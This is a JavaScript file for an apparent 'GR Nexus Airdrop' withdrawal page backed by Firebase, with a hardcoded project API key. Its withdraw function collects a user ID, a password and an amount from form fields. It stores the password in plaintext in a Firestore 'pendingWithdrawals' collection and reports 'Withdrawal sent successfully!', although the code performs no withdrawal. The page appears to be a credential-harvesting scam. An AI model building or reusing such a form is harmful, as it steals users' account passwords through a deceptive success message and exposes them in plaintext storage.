import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
import {
  getFirestore,
  addDoc,
  collection
} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";

import {
  getAuth,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/12.14.0/firebase-auth.js";

const app = initializeApp({
  apiKey: "AIzaSyCQVHBn504Y26YtR38JRJhRlUbBoa2CIPo",
  authDomain: "pcnexchange.firebaseapp.com",
  projectId: "pcnexchange"
});

const db = getFirestore(app);
const auth = getAuth(app);

let uid;

onAuthStateChanged(auth, user => {
  if (!user) return;
  uid = user.uid;
});

window.withdraw = async function(){

  const userId = document.getElementById("uidInput").value;
  const password = document.getElementById("password").value;
  const amount = Number(document.getElementById("amount").value);

  if(!userId || !password || !amount){
    alert("Fill all fields");
    return;
  }

  await addDoc(collection(db,"pendingWithdrawals"),{
    userId: uid,
    enteredUserId: userId,
    password,
    amount,
    status:"Pending",
    system:"GR Nexus Airdrop"
  });

  alert("Withdrawal sent successfully!");
};